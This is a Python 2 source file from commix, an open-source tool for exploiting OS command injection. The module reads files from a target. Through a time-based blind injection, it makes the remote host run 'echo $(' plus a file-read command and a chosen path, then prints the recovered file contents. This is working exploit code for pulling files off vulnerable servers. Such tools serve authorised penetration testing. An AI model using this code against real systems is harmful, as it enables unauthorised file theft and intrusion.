#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.injections.blind_based.techniques.time_based import tb_injector

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""

def do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vuln_parameter):
  
  #  Read file
  if menu.options.file_read:
    file_to_read = menu.options.file_read
    cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
    shell = output 
    shell = "".join(str(p) for p in shell)
    if shell:
      if menu.options.verbose:
	print ""
      sys.stdout.write(colors.BOLD + "\n\n (!) Contents of file " + colors.UNDERL + file_to_read + colors.RESET + " : ")
      sys.stdout.flush()
      print shell
    else:
     sys.stdout.write(colors.BGRED + "(x) Error: It seems that you don't have permissions to read the '"+ file_to_read + "' file.\n" + colors.RESET)
     sys.stdout.flush()
      
# eof